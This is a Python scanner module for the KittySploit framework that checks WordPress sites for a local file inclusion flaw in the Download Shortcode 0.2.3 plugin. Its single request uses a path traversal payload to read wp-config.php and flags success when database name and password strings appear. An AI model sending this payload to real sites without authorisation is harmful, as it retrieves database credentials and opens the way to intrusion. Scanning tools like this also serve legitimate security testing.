#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Download Shortcode 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Download Shortcode 0.2.3 - Local File Inclusion Detection',
        'description': 'WordPress Download Shortcode 0.2.3 is prone to a local file inclusion vulnerability because it fails to sufficiently sanitize user-supplied input. Exploiting this issue may allow an attacker to obtain sensitive information that could aid in further attacks. Prior versions may also be affected.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'lfi', 'shortcode', 'wp', 'packetstorm', 'wordpress', 'wp-plugin', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/128024/WordPress-ShortCode-1.1-Local-File-Inclusion.html',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/force-download.php?file=../wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Download Shortcode 0.2.3 - Local File Inclusion detected",
                path='/wp-content/force-download.php?file=../wp-config.php',
            )
            return True
        return False

